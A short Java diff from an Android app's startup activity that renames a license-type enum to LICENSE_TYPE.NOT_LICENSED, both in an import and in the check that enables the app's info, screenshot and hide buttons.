@@ -23,7 +23,7 @@ import system.service.config.MailCfg;
 import com.particle.inspector.common.util.DeviceProperty;
 import com.particle.inspector.common.util.FileCtrl;
 import com.particle.inspector.common.util.SysUtils;
-import com.particle.inspector.common.util.license.LicenseType;
+import com.particle.inspector.common.util.license.LICENSE_TYPE;
 
 public class InitActivity extends Activity 
 {
@@ -68,7 +68,7 @@ public class InitActivity extends Activity
         
         // Set button status
         boolean enabled = false;
-        if (ConfigCtrl.getLicenseType(getApplicationContext()) != LicenseType.NotLicensed) enabled = true;
+        if (ConfigCtrl.getLicenseType(getApplicationContext()) != LICENSE_TYPE.NOT_LICENSED) enabled = true;
         btn_getinfo.setEnabled(enabled);
         btn_screenshot.setEnabled(enabled);
         btn_hide.setEnabled(enabled);
